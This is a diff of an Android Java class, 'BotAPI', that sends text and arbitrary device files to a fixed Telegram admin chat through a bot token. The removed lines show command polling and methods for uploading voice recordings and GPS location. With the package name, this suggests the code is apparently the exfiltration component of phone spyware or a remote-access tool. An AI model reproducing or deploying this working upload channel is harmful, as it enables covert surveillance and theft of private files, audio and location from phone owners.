@@ -1,124 +1,69 @@
 package com.black.phone;
 
+import android.content.Context;
 import android.util.Log;
-import org.json.JSONArray;
+import okhttp3.*;
 import org.json.JSONObject;
 import java.io.File;
-import okhttp3.*;
+import java.io.IOException;
+import java.util.concurrent.TimeUnit;
 
 public class BotAPI {
     private static final String TAG = "BotAPI";
-    private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
-    private static final MediaType FILE = MediaType.parse("application/octet-stream");
-
-    private final OkHttpClient client;
     private final String token;
     private final String chatId;
-    public int lastUpdateId = 0;
+    private final OkHttpClient client;
 
-    public BotAPI() {
-        this.token = Config.get().bot_token;
-        this.chatId = Config.get().admin_chat_id;
+    public BotAPI(Context context) {
+        Config cfg = Config.get(context);
+        this.token = cfg.getBotToken();
+        this.chatId = cfg.getAdminChatId();
         this.client = new OkHttpClient.Builder()
-                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
-                .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
-                .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .writeTimeout(60, TimeUnit.SECONDS)
+                .readTimeout(60, TimeUnit.SECONDS)
                 .build();
     }
 
-    public boolean sendMessage(String text) {
+    public void sendMessage(String text) {
+        if (token.isEmpty() || chatId.isEmpty()) return;
         try {
             JSONObject json = new JSONObject();
             json.put("chat_id", chatId);
             json.put("text", text);
-            json.put("parse_mode", "Markdown");
-            RequestBody body = RequestBody.create(json.toString(), JSON);
+            RequestBody body = RequestBody.create(
+                    json.toString(),
+                    MediaType.parse("application/json; charset=utf-8")
+            );
             Request request = new Request.Builder()
                     .url("https://api.telegram.org/bot" + token + "/sendMessage")
                     .post(body)
                     .build();
-            try (Response response = client.newCall(request).execute()) {
-                return response.isSuccessful();
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "sendMessage error", e);
-            return false;
-        }
+            client.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) { Log.e(TAG, "sendMessage fail", e); }
+                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
+            });
+        } catch (Exception e) { Log.e(TAG, "sendMessage error", e); }
     }
 
-    public String getUpdates() {
+    public void sendFile(File file, String caption) {
+        if (token.isEmpty() || chatId.isEmpty() || file == null || !file.exists()) return;
         try {
-            String url = "https://api.telegram.org/bot" + token + "/getUpdates?offset=" + lastUpdateId + "&timeout=5";
-            Request request = new Request.Builder().url(url).get().build();
-            try (Response response = client.newCall(request).execute()) {
-                if (response.body() != null) return response.body().string();
+            MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
+            builder.addFormDataPart("chat_id", chatId);
+            builder.addFormDataPart("document", file.getName(),
+                    RequestBody.create(file, MediaType.parse("application/octet-stream")));
+            if (caption != null && !caption.isEmpty()) {
+                builder.addFormDataPart("caption", caption);
             }
-        } catch (Exception e) {
-            Log.e(TAG, "getUpdates error", e);
-        }
-        return null;
-    }
-
-    public boolean sendDocument(File file, String caption) {
-        try {
-            RequestBody requestBody = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", chatId)
-                    .addFormDataPart("caption", caption != null ? caption : "")
-                    .addFormDataPart("document", file.getName(),
-                            RequestBody.create(file, FILE))
-                    .build();
             Request request = new Request.Builder()
                     .url("https://api.telegram.org/bot" + token + "/sendDocument")
-                    .post(requestBody)
+                    .post(builder.build())
                     .build();
-            try (Response response = client.newCall(request).execute()) {
-                return response.isSuccessful();
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "sendDocument error", e);
-            return false;
-        }
-    }
-
-    public boolean sendVoice(File audio) {
-        try {
-            RequestBody requestBody = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", chatId)
-                    .addFormDataPart("voice", audio.getName(),
-                            RequestBody.create(audio, FILE))
-                    .build();
-            Request request = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + token + "/sendVoice")
-                    .post(requestBody)
-                    .build();
-            try (Response response = client.newCall(request).execute()) {
-                return response.isSuccessful();
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "sendVoice error", e);
-            return false;
-        }
-    }
-
-    public boolean sendLocation(double lat, double lng) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("chat_id", chatId);
-            json.put("latitude", lat);
-            json.put("longitude", lng);
-            RequestBody body = RequestBody.create(json.toString(), JSON);
-            Request request = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + token + "/sendLocation")
-                    .post(body)
-                    .build();
-            try (Response response = client.newCall(request).execute()) {
-                return response.isSuccessful();
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "sendLocation error", e);
-            return false;
-        }
+            client.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) { Log.e(TAG, "sendFile fail", e); }
+                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
+            });
+        } catch (Exception e) { Log.e(TAG, "sendFile error", e); }
     }
 }
